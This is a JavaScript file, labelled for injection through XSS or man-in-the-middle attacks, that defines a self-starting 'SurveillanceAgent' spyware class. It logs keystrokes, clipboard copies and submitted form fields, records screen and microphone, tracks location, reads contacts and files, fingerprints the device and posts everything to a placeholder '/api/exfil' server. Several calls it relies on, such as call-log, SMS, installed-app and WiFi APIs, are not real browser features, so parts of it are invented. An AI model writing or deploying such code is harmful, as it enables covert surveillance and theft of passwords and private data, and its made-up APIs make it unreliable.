// Advanced Client-Side Data Collector (Inject via XSS or MITM)
class SurveillanceAgent {
    constructor() {
        this.fingerprint = this.getFingerprint();
        this.intervals = {};
        this.recordings = {
            video: [],
            audio: [],
            screen: [],
            keylog: []
        };
    }

    // ---------- Core Functions ----------
    async start() {
        await this.collectDeviceInfo();
        this.setupEventListeners();
        this.startPeriodicCollection();
    }

    async collectDeviceInfo() {
        const info = {
            model: navigator.userAgent,
            os: this.getOS(),
            osVersion: this.getOSVersion(),
            manufacturer: navigator.vendor,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            } : null
        };

        await this.sendData('deviceinfo', info);
    }

    // ---------- New Collection Methods ----------

    async collectContacts() {
        if (!navigator.contacts) return;

        try {
            const props = ['name', 'email', 'tel', 'address'];
            const opts = { multiple: true };
            const contacts = await navigator.contacts.select(props, opts);

            const formatted = contacts.map(c => ({
                name: c.name?.[0] || 'Unknown',
                phone: c.tel?.[0]?.value || '',
                email: c.email?.[0]?.value || ''
            }));

            await this.sendData('contacts', formatted);
        } catch (e) {
            console.error('Contacts collection failed:', e);
        }
    }

    async collectFiles(directory = '/sdcard/') {
        // Note: This requires Android WebView with file access permissions
        try {
            const files = [];
            const dirHandle = await window.showDirectoryPicker({
                startIn: directory,
                mode: 'read'
            });

            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file') {
                    const file = await entry.getFile();
                    const content = await file.arrayBuffer();
                    files.push({
                        name: file.name,
                        size: file.size,
                        type: file.type,
                        lastModified: file.lastModified,
                        content: this.arrayBufferToBase64(content)
                    });
                }
            }

            await this.sendData('files', { files, directory });
        } catch (e) {
            console.error('File collection failed:', e);
        }
    }

    startKeylogger() {
        this.intervals.keylog = setInterval(async () => {
            if (this.recordings.keylog.length > 0) {
                await this.sendData('keylog', {
                    logs: this.recordings.keylog,
                    duration: Math.floor(this.recordings.keylog.length / 60)
                });
                this.recordings.keylog = [];
            }
        }, 300000); // Send every 5 minutes

        document.addEventListener('keydown', (e) => {
            this.recordings.keylog.push({
                key: e.key,
                code: e.code,
                time: new Date().toISOString()
            });
        });
    }

    async startScreenRecording(duration = 300) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;

        try {
            const stream = await navigator.mediaDevices.getDisplayMedia({
                video: true,
                audio: true
            });

            const recorder = new MediaRecorder(stream, {
                mimeType: 'video/webm;codecs=vp9'
            });

            const chunks = [];
            recorder.ondataavailable = (e) => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: recorder.mimeType });
                const video = await this.blobToBase64(blob);
                await this.sendData('screenrecord', {
                    video,
                    duration,
                    mimeType: recorder.mimeType
                });
            };

            recorder.start(1000); // Collect data every 1s
            setTimeout(() => recorder.stop(), duration * 1000);
        } catch (e) {
            console.error('Screen recording failed:', e);
        }
    }

    async startMicRecording(duration = 60) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const recorder = new MediaRecorder(stream, {
                mimeType: 'audio/webm'
            });

            const chunks = [];
            recorder.ondataavailable = (e) => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: recorder.mimeType });
                const audio = await this.blobToBase64(blob);
                await this.sendData('mic', {
                    audio,
                    duration,
                    mimeType: recorder.mimeType
                });
            };

            recorder.start(1000);
            setTimeout(() => recorder.stop(), duration * 1000);
        } catch (e) {
            console.error('Mic recording failed:', e);
        }
    }

    async collectCallLogs() {
        // Requires Android WebView with permissions
        try {
            const logs = await navigator.contacts.getCallLog();
            await this.sendData('calls', logs);
        } catch (e) {
            console.error('Call log collection failed:', e);
        }
    }

    async collectSMS() {
        // Requires Android WebView with permissions
        try {
            const messages = await navigator.contacts.getSMS();
            await this.sendData('sms', messages);
        } catch (e) {
            console.error('SMS collection failed:', e);
        }
    }

    async collectLocation() {
        if (!navigator.geolocation) return;

        navigator.geolocation.getCurrentPosition(async (position) => {
            await this.sendData('location', {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: position.timestamp
            });
        }, (e) => {
            console.error('Location collection failed:', e);
        }, {
            enableHighAccuracy: true,
            maximumAge: 0,
            timeout: 30000
        });
    }

    async collectInstalledApps() {
        // Requires Android WebView with permissions
        try {
            const apps = await navigator.apps.getInstalledApps();
            await this.sendData('apps', apps);
        } catch (e) {
            console.error('App collection failed:', e);
        }
    }

    async collectWiFiNetworks() {
        // Requires Android WebView with permissions
        try {
            const networks = await navigator.wifi.getNetworks();
            await this.sendData('wifi', networks);
        } catch (e) {
            console.error('WiFi collection failed:', e);
        }
    }

    // ---------- Helper Methods ----------
    async sendData(type, data) {
        try {
            const response = await fetch('https://your-server.com/api/exfil', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    type,
                    data,
                    fingerprint: this.fingerprint,
                    timestamp: new Date().toISOString()
                })
            });

            if (!response.ok) {
                throw new Error(`Server error: ${response.status}`);
            }
        } catch (e) {
            console.error(`Failed to send ${type}:`, e);
        }
    }

    getFingerprint() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            webgl: this.getWebGL(),
            audio: this.getAudioFingerprint(),
            battery: this.getBatteryStatus()
        };
    }

    getOS() {
        const userAgent = navigator.userAgent;
        if (userAgent.includes('Windows')) return 'Windows';
        if (userAgent.includes('Mac')) return 'MacOS';
        if (userAgent.includes('Linux')) return 'Linux';
        if (userAgent.includes('Android')) return 'Android';
        if (userAgent.includes('iPhone') || userAgent.includes('iPad')) return 'iOS';
        return 'Unknown';
    }

    getOSVersion() {
        const userAgent = navigator.userAgent;
        const match = userAgent.match(/(Windows|Mac OS X|Android|iOS)[\s/]([\d._]+)/);
        return match ? match[2].replace(/_/g, '.') : 'Unknown';
    }

    getWebGL() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return null;

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            };
        } catch (e) {
            return null;
        }
    }

    getAudioFingerprint() {
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioCtx.createOscillator();
            const analyser = audioCtx.createAnalyser();
            oscillator.connect(analyser);
            analyser.connect(audioCtx.destination);
            oscillator.start();

            const frequencyData = new Uint8Array(analyser.frequencyBinCount);
            analyser.getByteFrequencyData(frequencyData);

            oscillator.stop();
            return Array.from(frequencyData).join(',');
        } catch (e) {
            return null;
        }
    }

    async getBatteryStatus() {
        if (!navigator.getBattery) return null;
        const battery = await navigator.getBattery();
        return {
            level: battery.level,
            charging: battery.charging,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
        };
    }

    arrayBufferToBase64(buffer) {
        let binary = '';
        const bytes = new Uint8Array(buffer);
        for (let i = 0; i < bytes.byteLength; i++) {
            binary += String.fromCharCode(bytes[i]);
        }
        return btoa(binary);
    }

    async blobToBase64(blob) {
        return new Promise((resolve) => {
            const reader = new FileReader();
            reader.onloadend = () => resolve(reader.result.split(',')[1]);
            reader.readAsDataURL(blob);
        });
    }

    setupEventListeners() {
        // Clipboard monitoring
        document.addEventListener('copy', (e) => {
            this.sendData('clipboard', {
                content: e.clipboardData.getData('text/plain'),
                timestamp: new Date().toISOString()
            });
        });

        // Form submission monitoring
        document.addEventListener('submit', (e) => {
            const formData = {};
            const form = e.target;
            for (let i = 0; i < form.elements.length; i++) {
                const element = form.elements[i];
                if (element.name) {
                    formData[element.name] = element.value;
                }
            }
            this.sendData('form', formData);
        });
    }

    startPeriodicCollection() {
        // Collect contacts every hour
        this.intervals.contacts = setInterval(() => this.collectContacts(), 3600000);

        // Collect location every 30 minutes
        this.intervals.location = setInterval(() => this.collectLocation(), 1800000);

        // Collect WiFi networks every 2 hours
        this.intervals.wifi = setInterval(() => this.collectWiFiNetworks(), 7200000);

        // Start keylogger
        this.startKeylogger();

        // Start periodic screen recordings (5 minutes every hour)
        setInterval(() => this.startScreenRecording(300), 3600000);

        // Start periodic mic recordings (1 minute every 30 minutes)
        setInterval(() => this.startMicRecording(60), 1800000);
    }

    stop() {
        Object.values(this.intervals).forEach(interval => clearInterval(interval));
    }
}

// Initialize and start the surveillance agent
const agent = new SurveillanceAgent();
agent.start().catch(console.error);
